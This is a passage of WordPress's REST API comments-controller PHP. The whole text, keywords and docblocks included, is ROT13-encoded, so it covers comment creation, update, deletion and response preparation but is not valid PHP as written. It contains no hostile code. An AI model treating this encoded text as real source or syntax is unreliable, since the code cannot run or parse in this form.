			vs ( 'pbzzrag_sybbq' === $reebe_pbqr ) {
				erghea arj JC_Reebe(
					$reebe_pbqr,
					$reebe_zrffntr,
					neenl( 'fgnghf' => 400 )
				);
			}

			erghea $cercnerq_pbzzrag['pbzzrag_nccebirq'];
		}

		/**
		 * Svygref n pbzzrag orsber vg vf vafregrq ivn gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur pbzzrag evtug orsber vg vf vafregrq ivn jc_vafreg_pbzzrag().
		 * Ergheavat n JC_Reebe inyhr sebz gur svygre jvyy fubeg-pvephvg vafregvba naq nyybj
		 * fxvccvat shegure cebprffvat.
		 *
		 * @fvapr 4.7.0
		 * @fvapr 4.8.0 `$cercnerq_pbzzrag` pna abj or n JC_Reebe gb fubeg-pvephvg vafregvba.
		 *
		 * @cnenz neenl|JC_Reebe  $cercnerq_pbzzrag Gur cercnerq pbzzrag qngn sbe jc_vafreg_pbzzrag().
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg          Erdhrfg hfrq gb vafreg gur pbzzrag.
		 */
		$cercnerq_pbzzrag = nccyl_svygref( 'erfg_cer_vafreg_pbzzrag', $cercnerq_pbzzrag, $erdhrfg );
		vs ( vf_jc_reebe( $cercnerq_pbzzrag ) ) {
			erghea $cercnerq_pbzzrag;
		}

		$pbzzrag_vq = jc_vafreg_pbzzrag( jc_svygre_pbzzrag( jc_fynfu( (neenl) $cercnerq_pbzzrag ) ) );

		vs ( ! $pbzzrag_vq ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_snvyrq_perngr',
				__( 'Perngvat pbzzrag snvyrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		vs ( vffrg( $erdhrfg['fgnghf'] ) ) {
			$guvf->unaqyr_fgnghf_cnenz( $erdhrfg['fgnghf'], $pbzzrag_vq );
		}

		$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

		/**
		 * Sverf nsgre n pbzzrag vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Pbzzrag      $pbzzrag  Vafregrq be hcqngrq pbzzrag bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n pbzzrag, snyfr
		 *                                  jura hcqngvat.
		 */
		qb_npgvba( 'erfg_vafreg_pbzzrag', $pbzzrag, $erdhrfg, gehr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $pbzzrag_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $pbzzrag, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$pbagrkg = pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ? 'rqvg' : 'ivrj';
		$erdhrfg->frg_cnenz( 'pbagrkg', $pbagrkg );

		/**
		 * Sverf pbzcyrgryl nsgre n pbzzrag vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_Pbzzrag      $pbzzrag  Vafregrq be hcqngrq pbzzrag bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n pbzzrag, snyfr
		 *                                  jura hcqngvat.
		 */
		qb_npgvba( 'erfg_nsgre_vafreg_pbzzrag', $pbzzrag, $erdhrfg, gehr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $pbzzrag_vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira ERFG erdhrfg unf npprff gb hcqngr n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		vs ( ! $guvf->purpx_rqvg_crezvffvba( $pbzzrag ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf pbzzrag.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		$vq = $pbzzrag->pbzzrag_VQ;

		vs ( vffrg( $erdhrfg['glcr'] ) && trg_pbzzrag_glcr( $vq ) !== $erdhrfg['glcr'] ) {
			erghea arj JC_Reebe(
				'erfg_pbzzrag_vainyvq_glcr',
				__( 'Fbeel, lbh ner abg nyybjrq gb punatr gur pbzzrag glcr.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$cercnerq_netf = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cercnerq_netf ) ) {
			erghea $cercnerq_netf;
		}

		vs ( ! rzcgl( $cercnerq_netf['pbzzrag_cbfg_VQ'] ) ) {
			$cbfg = trg_cbfg( $cercnerq_netf['pbzzrag_cbfg_VQ'] );

			vs ( rzcgl( $cbfg ) ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_vainyvq_cbfg_vq',
					__( 'Vainyvq cbfg VQ.' ),
					neenl( 'fgnghf' => 403 )
				);
			}
		}

		vs ( rzcgl( $cercnerq_netf ) && vffrg( $erdhrfg['fgnghf'] ) ) {
			// Bayl gur pbzzrag fgnghf vf orvat punatrq.
			$punatr = $guvf->unaqyr_fgnghf_cnenz( $erdhrfg['fgnghf'], $vq );

			vs ( ! $punatr ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_snvyrq_rqvg',
					__( 'Hcqngvat pbzzrag fgnghf snvyrq.' ),
					neenl( 'fgnghf' => 500 )
				);
			}
		} ryfrvs ( ! rzcgl( $cercnerq_netf ) ) {
			vs ( vf_jc_reebe( $cercnerq_netf ) ) {
				erghea $cercnerq_netf;
			}

			vs ( vffrg( $cercnerq_netf['pbzzrag_pbagrag'] ) && rzcgl( $cercnerq_netf['pbzzrag_pbagrag'] ) ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_pbagrag_vainyvq',
					__( 'Vainyvq pbzzrag pbagrag.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$cercnerq_netf['pbzzrag_VQ'] = $vq;

			$purpx_pbzzrag_yratguf = jc_purpx_pbzzrag_qngn_znk_yratguf( $cercnerq_netf );

			vs ( vf_jc_reebe( $purpx_pbzzrag_yratguf ) ) {
				$reebe_pbqr = $purpx_pbzzrag_yratguf->trg_reebe_pbqr();
				erghea arj JC_Reebe(
					$reebe_pbqr,
					__( 'Pbzzrag svryq rkprrqf znkvzhz yratgu nyybjrq.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$hcqngrq = jc_hcqngr_pbzzrag( jc_fynfu( (neenl) $cercnerq_netf ), gehr );

			vs ( vf_jc_reebe( $hcqngrq ) ) {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_snvyrq_rqvg',
					__( 'Hcqngvat pbzzrag snvyrq.' ),
					neenl( 'fgnghf' => 500 )
				);
			}

			vs ( vffrg( $erdhrfg['fgnghf'] ) ) {
				$guvf->unaqyr_fgnghf_cnenz( $erdhrfg['fgnghf'], $vq );
			}
		}

		$pbzzrag = trg_pbzzrag( $vq );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-pbzzragf-pbagebyyre.cuc */
		qb_npgvba( 'erfg_vafreg_pbzzrag', $pbzzrag, $erdhrfg, snyfr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $pbzzrag, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-pbzzragf-pbagebyyre.cuc */
		qb_npgvba( 'erfg_nsgre_vafreg_pbzzrag', $pbzzrag, $erdhrfg, snyfr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		vs ( ! $guvf->purpx_rqvg_crezvffvba( $pbzzrag ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf pbzzrag.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}
		erghea gehr;
	}

	/**
	 * Qryrgrf n pbzzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$pbzzrag = $guvf->trg_pbzzrag( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $pbzzrag ) ) {
			erghea $pbzzrag;
		}

		$sbepr = vffrg( $erdhrfg['sbepr'] ) ? (obby) $erdhrfg['sbepr'] : snyfr;

		/**
		 * Svygref jurgure n pbzzrag pna or genfurq ivn gur ERFG NCV.
		 *
		 * Erghea snyfr gb qvfnoyr genfu fhccbeg sbe gur pbzzrag.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz obby       $fhccbegf_genfu Jurgure gur pbzzrag fhccbegf genfuvat.
		 * @cnenz JC_Pbzzrag $pbzzrag        Gur pbzzrag bowrpg orvat pbafvqrerq sbe genfuvat fhccbeg.
		 */
		$fhccbegf_genfu = nccyl_svygref( 'erfg_pbzzrag_genfunoyr', ( RZCGL_GENFU_QNLF > 0 ), $pbzzrag );

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		vs ( $sbepr ) {
			$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );
			$erfhyg   = jc_qryrgr_pbzzrag( $pbzzrag->pbzzrag_VQ, gehr );
			$erfcbafr = arj JC_ERFG_Erfcbafr();
			$erfcbafr->frg_qngn(
				neenl(
					'qryrgrq'  => gehr,
					'cerivbhf' => $cerivbhf->trg_qngn(),
				)
			);
		} ryfr {
			// Vs guvf glcr qbrfa'g fhccbeg genfuvat, reebe bhg.
			vs ( ! $fhccbegf_genfu ) {
				erghea arj JC_Reebe(
					'erfg_genfu_abg_fhccbegrq',
					/* genafyngbef: %f: sbepr=gehr */
					fcevags( __( \"Gur pbzzrag qbrf abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ),
					neenl( 'fgnghf' => 501 )
				);
			}

			vs ( 'genfu' === $pbzzrag->pbzzrag_nccebirq ) {
				erghea arj JC_Reebe(
					'erfg_nyernql_genfurq',
					__( 'Gur pbzzrag unf nyernql orra genfurq.' ),
					neenl( 'fgnghf' => 410 )
				);
			}

			$erfhyg   = jc_genfu_pbzzrag( $pbzzrag->pbzzrag_VQ );
			$pbzzrag  = trg_pbzzrag( $pbzzrag->pbzzrag_VQ );
			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $pbzzrag, $erdhrfg );
		}

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur pbzzrag pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		/**
		 * Sverf nsgre n pbzzrag vf qryrgrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Pbzzrag       $pbzzrag  Gur qryrgrq pbzzrag qngn.
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr erghearq sebz gur NCV.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( 'erfg_qryrgr_pbzzrag', $pbzzrag, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr pbzzrag bhgchg sbe erfcbafr.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 5.9.0 Eranzrq `$pbzzrag` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Pbzzrag      $vgrz    Pbzzrag bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$pbzzrag = $vgrz;

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-pbzzragf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_pbzzrag', arj JC_ERFG_Erfcbafr( neenl() ), $pbzzrag, $erdhrfg );
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( va_neenl( 'vq', $svryqf, gehr ) ) {
			$qngn['vq'] = (vag) $pbzzrag->pbzzrag_VQ;
		}

		vs ( va_neenl( 'cbfg', $svryqf, gehr ) ) {
			$qngn['cbfg'] = (vag) $pbzzrag->pbzzrag_cbfg_VQ;
		}

		vs ( va_neenl( 'cnerag', $svryqf, gehr ) ) {
			$qngn['cnerag'] = (vag) $pbzzrag->pbzzrag_cnerag;
		}

		vs ( va_neenl( 'nhgube', $svryqf, gehr ) ) {
			$qngn['nhgube'] = (vag) $pbzzrag->hfre_vq;
		}

		vs ( va_neenl( 'nhgube_anzr', $svryqf, gehr ) ) {
			$qngn['nhgube_anzr'] = $pbzzrag->pbzzrag_nhgube;
		}

		vs ( va_neenl( 'nhgube_rznvy', $svryqf, gehr ) ) {
			$qngn['nhgube_rznvy'] = $pbzzrag->pbzzrag_nhgube_rznvy;
		}

		vs ( va_neenl( 'nhgube_hey', $svryqf, gehr ) ) {
			$qngn['nhgube_hey'] = $pbzzrag->pbzzrag_nhgube_hey;
		}

		vs ( va_neenl( 'nhgube_vc', $svryqf, gehr ) ) {
			$qngn['nhgube_vc'] = $pbzzrag->pbzzrag_nhgube_VC;
		}

		vs ( va_neenl( 'nhgube_hfre_ntrag', $svryqf, gehr ) ) {
			$qngn['nhgube_hfre_ntrag'] = $pbzzrag->pbzzrag_ntrag;
		}

		vs ( va_neenl( 'qngr', $svryqf, gehr ) ) {
			$qngn['qngr'] = zlfdy_gb_esp3339( $pbzzrag->pbzzrag_qngr );
		}

		vs ( va_neenl( 'qngr_tzg', $svryqf, gehr ) ) {
			$qngn['qngr_tzg'] = zlfdy_gb_esp3339( $pbzzrag->pbzzrag_qngr_tzg );
		}

		vs ( va_neenl( 'pbagrag', $svryqf, gehr ) ) {
			$qngn['pbagrag'] = neenl(
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pbzzrag-grzcyngr.cuc */
				'eraqrerq' => nccyl_svygref( 'pbzzrag_grkg', $pbzzrag->pbzzrag_pbagrag, $pbzzrag, neenl() ),
				'enj'      => $pbzzrag->pbzzrag_pbagrag,
			);
		}

		vs ( va_neenl( 'yvax', $svryqf, gehr ) ) {
			$qngn['yvax'] = trg_pbzzrag_yvax( $pbzzrag );
		}

		vs ( va_neenl( 'fgnghf', $svryqf, gehr ) ) {
			$qngn['fgnghf'] = $guvf->cercner_fgnghf_erfcbafr( $pbzzrag->pbzzrag_nccebirq );
		}

		vs ( va_neenl( 'glcr', $svryqf, gehr ) ) {
			$qngn['glcr'] = trg_pbzzrag_glcr( $pbzzrag->pbzzrag_VQ );
		}

		vs ( va_neenl( 'nhgube_ningne_heyf', $svryqf, gehr ) ) {
			$qngn['nhgube_ningne_heyf'] = erfg_trg_ningne_heyf( $pbzzrag );
		}

		vs ( va_neenl( 'zrgn', $svryqf, gehr ) ) {
			$qngn['zrgn'] = $guvf->zrgn->trg_inyhr( $pbzzrag->pbzzrag_VQ, $erdhrfg );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $pbzzrag ) );
		}

		/**
		 * Svygref n pbzzrag erghearq sebz gur ERFG NCV.
		 *
		 * Nyybjf zbqvsvpngvba bs gur pbzzrag evtug orsber vg vf erghearq.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr  $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Pbzzrag        $pbzzrag  Gur bevtvany pbzzrag bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg   $erdhrfg  Erdhrfg hfrq gb trarengr gur erfcbafr.
		 */
		erghea nccyl_svygref( 'erfg_cercner_pbzzrag', $erfcbafr, $pbzzrag, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira pbzzrag.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $pbzzrag ) {
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $pbzzrag->pbzzrag_VQ ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			),
		);

		vs ( 0 !== (vag) $pbzzrag->hfre_vq ) {
			$yvaxf['nhgube'] = neenl(
				'uers'       => erfg_hey( 'jc/i2/hfref/' . $pbzzrag->hfre_vq ),
				'rzorqqnoyr' => gehr,
			);
		}

		vs ( 0 !== (vag) $pbzzrag->pbzzrag_cbfg_VQ ) {
			$cbfg       = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
			$cbfg_ebhgr = erfg_trg_ebhgr_sbe_cbfg( $cbfg );

			vs ( ! rzcgl( $cbfg->VQ ) && $cbfg_ebhgr ) {
				$yvaxf['hc'] = neenl(
					'uers'       => erfg_hey( $cbfg_ebhgr ),
					'rzorqqnoyr' => gehr,
					'cbfg_glcr'  => $cbfg->cbfg_glcr,
				);
			}
		}

		vs ( 0 !== (vag) $pbzzrag->pbzzrag_cnerag ) {
			$yvaxf['va-ercyl-gb'] = neenl(
				'uers'       => erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $pbzzrag->pbzzrag_cnerag ) ),
				'rzorqqnoyr' => gehr,
			);
		}

		// Bayl teno bar pbzzrag gb irevsl gur pbzzrag unf puvyqera.
		$pbzzrag_puvyqera = $pbzzrag->trg_puvyqera(
			neenl(
				'pbhag'   => gehr,
				'beqreol' => 'abar',
			)
		);

		vs ( ! rzcgl( $pbzzrag_puvyqera ) ) {
			$netf = neenl(
				'cnerag' => $pbzzrag->pbzzrag_VQ,
			);

			$erfg_hey = nqq_dhrel_net( $netf, erfg_hey( $guvf->anzrfcnpr . '/' . $guvf->erfg_onfr ) );

			$yvaxf['puvyqera'] = neenl(
				'uers'       => $erfg_hey,
				'rzorqqnoyr' => gehr,
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Cercraqf vagreany cebcregl cersvk gb dhrel cnenzrgref gb zngpu bhe erfcbafr svryqf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $dhrel_cnenz Dhrel cnenzrgre.
	 * @erghea fgevat Gur abeznyvmrq dhrel cnenzrgre.
	 */
	cebgrpgrq shapgvba abeznyvmr_dhrel_cnenz( $dhrel_cnenz ) {
		$cersvk = 'pbzzrag_';

		fjvgpu ( $dhrel_cnenz ) {
			pnfr 'vq':
				$abeznyvmrq = $cersvk . 'VQ';
				oernx;
			pnfr 'cbfg':
				$abeznyvmrq = $cersvk . 'cbfg_VQ';
				oernx;
			pnfr 'cnerag':
				$abeznyvmrq = $cersvk . 'cnerag';
				oernx;
			pnfr 'vapyhqr':
				$abeznyvmrq = 'pbzzrag__va';
				oernx;
			qrsnhyg:
				$abeznyvmrq = $cersvk . $dhrel_cnenz;
				oernx;
		}

		erghea $abeznyvmrq;
	}

	/**
	 * Purpxf pbzzrag_nccebirq gb frg pbzzrag fgnghf sbe fvatyr pbzzrag bhgchg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $pbzzrag_nccebirq Pbzzrag fgnghf.
	 * @erghea fgevat Pbzzrag fgnghf.
	 */
	cebgrpgrq shapgvba cercner_fgnghf_erfcbafr( $pbzzrag_nccebirq ) {

		fjvgpu ( $pbzzrag_nccebirq ) {
			pnfr 'ubyq':
			pnfr '0':
				$fgnghf = 'ubyq';
				oernx;

			pnfr 'nccebir':
			pnfr '1':
				$fgnghf = 'nccebirq';
				oernx;

			pnfr 'fcnz':
			pnfr 'genfu':
			qrsnhyg:
				$fgnghf = $pbzzrag_nccebirq;
				oernx;
		}

		erghea $fgnghf;
	}

	/**
	 * Cercnerf n fvatyr pbzzrag gb or vafregrq vagb gur qngnonfr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea neenl|JC_Reebe Cercnerq pbzzrag, bgurejvfr JC_Reebe bowrpg.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_pbzzrag = neenl();

		/*
		 * Nyybj gur pbzzrag_pbagrag gb or frg ivn gur 'pbagrag' be
		 * gur 'pbagrag.enj' cebcregvrf bs gur Erdhrfg bowrpg.
		 */
		vs ( vffrg( $erdhrfg['pbagrag'] ) && vf_fgevat( $erdhrfg['pbagrag'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_pbagrag'] = gevz( $erdhrfg['pbagrag'] );
		} ryfrvs ( vffrg( $erdhrfg['pbagrag']['enj'] ) && vf_fgevat( $erdhrfg['pbagrag']['enj'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_pbagrag'] = gevz( $erdhrfg['pbagrag']['enj'] );
		}

		vs ( vffrg( $erdhrfg['cbfg'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_cbfg_VQ'] = (vag) $erdhrfg['cbfg'];
		}

		vs ( vffrg( $erdhrfg['cnerag'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_cnerag'] = $erdhrfg['cnerag'];
		}

		vs ( vffrg( $erdhrfg['nhgube'] ) ) {
			$hfre = arj JC_Hfre( $erdhrfg['nhgube'] );

			vs ( $hfre->rkvfgf() ) {
				$cercnerq_pbzzrag['hfre_vq']              = $hfre->VQ;
				$cercnerq_pbzzrag['pbzzrag_nhgube']       = $hfre->qvfcynl_anzr;
				$cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] = $hfre->hfre_rznvy;
				$cercnerq_pbzzrag['pbzzrag_nhgube_hey']   = $hfre->hfre_hey;
			} ryfr {
				erghea arj JC_Reebe(
					'erfg_pbzzrag_nhgube_vainyvq',
					__( 'Vainyvq pbzzrag nhgube VQ.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		vs ( vffrg( $erdhrfg['nhgube_anzr'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube'] = $erdhrfg['nhgube_anzr'];
		}

		vs ( vffrg( $erdhrfg['nhgube_rznvy'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_rznvy'] = $erdhrfg['nhgube_rznvy'];
		}

		vs ( vffrg( $erdhrfg['nhgube_hey'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_hey'] = $erdhrfg['nhgube_hey'];
		}

		vs ( vffrg( $erdhrfg['nhgube_vc'] ) && pheerag_hfre_pna( 'zbqrengr_pbzzragf' ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_VC'] = $erdhrfg['nhgube_vc'];
		} ryfrvs ( ! rzcgl( $_FREIRE['ERZBGR_NQQE'] ) && erfg_vf_vc_nqqerff( $_FREIRE['ERZBGR_NQQE'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_nhgube_VC'] = $_FREIRE['ERZBGR_NQQE'];
		} ryfr {
			$cercnerq_pbzzrag['pbzzrag_nhgube_VC'] = '127.0.0.1';
		}

		vs ( ! rzcgl( $erdhrfg['nhgube_hfre_ntrag'] ) ) {
			$cercnerq_pbzzrag['pbzzrag_ntrag'] = $erdhrfg['nhgube_hfre_ntrag'];
		} ryfrvs ( $erdhrfg->trg_urnqre( 'hfre_ntrag' ) ) {
			$cercnerq_pbzzrag['pbzzrag_ntrag'] = $erdhrfg->trg_urnqre( 'hfre_ntrag' );
		}

		vs ( ! rzcgl( $erdhrfg['qngr'] ) ) {
			$qngr_qngn = erfg_trg_qngr_jvgu_tzg( $erdhrfg['qngr'] );

			vs ( ! rzcgl( $qngr_qngn ) ) {
				yvfg( $cercnerq_pbzzrag['pbzzrag_qngr'], $cercnerq_pbzzrag['pbzzrag_qngr_tzg'] ) = $qngr_qngn;
			}
		} ryfrvs ( ! rzcgl( $erdhrfg['qngr_tzg'] ) ) {
			$qngr_qngn = erfg_trg_qngr_jvgu_tzg( $erdhrfg['qngr_tzg'], gehr );

			vs ( ! rzcgl( $qngr_qngn ) ) {
				yvfg( $cercnerq_pbzzrag['pbzzrag_qngr'], $cercnerq_pbzzrag['pbzzrag_qngr_tzg'] ) = $qngr_qngn;
			}
		}

		/**
		 * Svygref n pbzzrag nqqrq ivn gur ERFG NCV nsgre vg vf cercnerq sbe vafregvba vagb gur qngnonfr.
		 *
		 * Nyybjf zbqvsvpngvba bs gur pbzzrag evtug nsgre vg vf cercnerq sbe gur qngnonfr.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl           $cercnerq_pbzzrag Gur cercnerq pbzzrag qngn sbe `jc_vafreg_pbzzrag`.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg          Gur pheerag erdhrfg.
		 */
		erghea nccyl_svygref( 'erfg_cercebprff_pbzzrag', $cercnerq_pbzzrag, $erdhrfg );
	}

	/**
	 * Ergevrirf gur pbzzrag'f fpurzn, pbasbezvat gb WFBA Fpurzn.
